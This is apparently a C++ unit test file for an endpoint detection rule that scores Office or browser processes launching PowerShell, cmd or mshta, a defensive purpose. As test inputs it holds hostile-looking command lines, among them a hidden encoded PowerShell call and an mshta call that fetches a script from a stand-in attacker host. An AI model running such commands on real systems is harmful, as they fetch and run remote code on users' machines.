/*
 * lolbin_parent_child_detector_tests.cpp - Unit tests for
 * ScoreLolbinParentChild and the production rules it feeds (EDR-255/256).
 */
#include "lolbin_parent_child_detector_tests.h"

#include <windows.h>

#include <algorithm>
#include <cstring>
#include <stdexcept>
#include <string>
#include <vector>

#include "edr_event.h"
#include "event_bus.h"
#include "lolbin_parent_child_detector.h"
#include "rule_engine.h"

namespace {

#define LB_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "lolbin parent-child detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

const char* ProductionRulesPath() {
    return GetFileAttributesA("..\\rules\\rules.json") !=
                   INVALID_FILE_ATTRIBUTES
        ? "..\\rules\\rules.json"
        : "rules\\rules.json";
}

bool HasFlag(const edr::LolbinScoreResult& result, const char* flag) {
    return std::find(result.flags.begin(), result.flags.end(), flag) !=
           result.flags.end();
}

void TestOfficePowershellMalicious() {
    edr::LolbinScoreResult result = edr::ScoreLolbinParentChild(
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell -nop -w hidden -enc AAAA");
    LB_CHECK(result.parentClass == "office");
    LB_CHECK(result.childClass == "powershell");
    LB_CHECK(result.score >= 70);
    LB_CHECK(HasFlag(result, "LOLBIN_PARENT_office"));
    LB_CHECK(HasFlag(result, "LOLBIN_CHILD_powershell"));
    LB_CHECK(HasFlag(result, "LOLBIN_ENCODED"));
    LB_CHECK(HasFlag(result, "LOLBIN_HIDDEN"));
    LB_CHECK(std::strcmp(edr::LolbinVerdict(result.score), "MALICIOUS") == 0);
}

void TestBrowserCmdNoStampWithoutBooster() {
    edr::LolbinScoreResult result = edr::ScoreLolbinParentChild(
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "cmd.exe /c dir");
    LB_CHECK(result.score == 0);
    LB_CHECK(result.parentClass.empty() || result.score == 0);
}

void TestUnknownParentIgnored() {
    edr::LolbinScoreResult result = edr::ScoreLolbinParentChild(
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell -enc AAAA");
    LB_CHECK(result.score == 0);
    LB_CHECK(result.parentClass.empty());
}

void TestEnrichStampsAboveMinScore() {
    edr::LolbinParentChildDetector detector(true, 50);
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kParentImage] =
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE";
    event.fields[edr::field::kImage] =
        "C:\\Windows\\System32\\mshta.exe";
    event.fields[edr::field::kCommandLine] = "mshta https://evil.test/x.hta";
    detector.Enrich(event);
    LB_CHECK(event.fields.at(edr::field::kLolbinScore).size() > 0);
    LB_CHECK(event.fields.at(edr::field::kLolbinParentClass) == "office");
    LB_CHECK(event.fields.at(edr::field::kLolbinChildClass) == "script");
    LB_CHECK(event.fields.at(edr::field::kLolbinVerdict) == "MALICIOUS" ||
             event.fields.at(edr::field::kLolbinVerdict) == "SUSPICIOUS");
}

void TestDisabledAndMissingParent() {
    edr::LolbinParentChildDetector off(false, 50);
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kParentImage] =
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
    event.fields[edr::field::kImage] = "powershell.exe";
    off.Enrich(event);
    LB_CHECK(event.fields.find(edr::field::kLolbinScore) == event.fields.end());

    edr::LolbinParentChildDetector on(true, 50);
    edr::Event noParent;
    noParent.type = EDR_EVT_PROCESS_START;
    noParent.fields[edr::field::kType] = "PROCESS_START";
    noParent.fields[edr::field::kImage] = "powershell.exe";
    on.Enrich(noParent);
    LB_CHECK(noParent.fields.find(edr::field::kLolbinScore) ==
             noParent.fields.end());
}

void TestProductionRules() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const edr::Alert& alert) {
        hits.push_back(alert.ruleId);
    });

    edr::LolbinParentChildDetector detector(true, 50);
    edr::Event high;
    high.type = EDR_EVT_PROCESS_START;
    high.fields[edr::field::kType] = "PROCESS_START";
    high.fields[edr::field::kParentImage] =
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
    high.fields[edr::field::kImage] =
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    high.fields[edr::field::kCommandLine] = "powershell -enc AAAA";
    detector.Enrich(high);
    engine.OnEvent(high);
    LB_CHECK(std::find(hits.begin(), hits.end(), "EDR-255") != hits.end());

    hits.clear();
    edr::Event mid;
    mid.type = EDR_EVT_PROCESS_START;
    mid.fields[edr::field::kType] = "PROCESS_START";
    mid.fields[edr::field::kParentImage] =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    mid.fields[edr::field::kImage] = "C:\\Windows\\System32\\cmd.exe";
    mid.fields[edr::field::kCommandLine] = "cmd.exe /c echo hi";
    detector.Enrich(mid);
    engine.OnEvent(mid);
    LB_CHECK(std::find(hits.begin(), hits.end(), "EDR-255") == hits.end());
}

} // namespace

void RunLolbinParentChildDetectorTests() {
    TestOfficePowershellMalicious();
    TestBrowserCmdNoStampWithoutBooster();
    TestUnknownParentIgnored();
    TestEnrichStampsAboveMinScore();
    TestDisabledAndMissingParent();
    TestProductionRules();
}
